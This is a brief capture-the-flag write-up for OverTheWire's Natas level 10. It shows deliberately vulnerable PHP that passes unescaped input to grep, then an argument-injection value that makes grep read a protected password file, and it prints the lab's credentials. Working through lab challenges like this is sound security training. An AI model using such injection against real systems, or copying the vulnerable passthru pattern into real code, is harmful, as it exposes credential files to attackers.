# Natas Level 10
The ***URL*** to which you need to connect is *http://natas10.natas.labs.overthewire.org*. The ***username*** is *natas10* and the ***password*** is *nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu*. 

Lets check the [viewsource](http://natas10.natas.labs.overthewire.org/index-source.html) link.
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

By analysing the php script we see that there's certain characters like ;, | and &. Therefore, we can exploit the features in grep command like you can search in 2 files.

```
[A-Z] /etc/natas_webpass/natas11
```

```
Password : U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
